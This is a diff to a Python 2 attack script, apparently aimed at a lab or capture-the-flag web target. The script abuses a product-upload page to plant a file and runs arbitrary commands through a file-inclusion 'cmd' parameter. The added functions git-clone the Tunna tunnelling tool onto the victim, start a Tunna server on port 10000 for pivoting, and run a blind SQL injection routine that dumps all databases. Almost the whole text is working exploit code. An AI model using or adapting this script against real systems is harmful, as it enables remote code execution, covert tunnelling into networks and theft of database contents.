@@ -6,6 +6,7 @@ from config import config
 from BeautifulSoup import BeautifulSoup
 import requests
 from blind_sqli import BlindSql
+import threading
 
 
 def https(method, path, data=""):
@@ -47,7 +48,7 @@ def login(url):
     return s
 
 
-def up_tunna_shell():
+def run_shell_cmd(cmd, verbose=False):
     url_addp = config['url'] + "/addproduct.php"
     user = login(config['url'])
 
@@ -74,15 +75,29 @@ def up_tunna_shell():
             location = pdetail[1].contents[0].get("src")
             break
 
-    cmd = config['cmd']
     h2 = https("GET", "/index.php?page={0}&cmd={1}".format(location, cmd.replace(" ", "%20")))
     response = h2.getresponse()
 
     if response.status == 200:
-        print "\n[i] Upload tunna shell successfull"
+        print "\n[i] RCE succesfully"
+        if verbose:
+            text = response.read()
+            print "-" * 80
+            print text.split(config["interupt"])[1]
+            print "-" * 80
     else:
-        print "\n[i] Upload fail"
+        print "\n[i] RCE fail"
         sys.exit(1)
+
+
+def start_tunna_server(verbose=False):
+    print "[i] Create thread to run remote tunna server if possible, tunna server will run in port 10000"
+    threading.Thread(target=run_shell_cmd, args=(config['run_tunna_server'], verbose)).start()
+
+
+def upload_tunna_socks(verbose=False):
+    print '[i] Upload tunna socks'
+    run_shell_cmd(config['git_clone_tunna'], verbose)
 
 
 def dumb_all_db(blind_obj):
@@ -116,7 +131,13 @@ def banner():
 
 if __name__ == '__main__':
     banner()
-    vulnerable_url = config['vulnerable_url']
-    blind = BlindSql(vulnerable_url, verbose=True)
+
+    # Setup connection
+    if config['upload_tunna']:
+        upload_tunna_socks()
+    if config['use_tunna_server']:
+        start_tunna_server()
+
+    blind = BlindSql(config['vulnerable_url'], verbose=config['verbose'])
     dumb_all_db(blind)
 
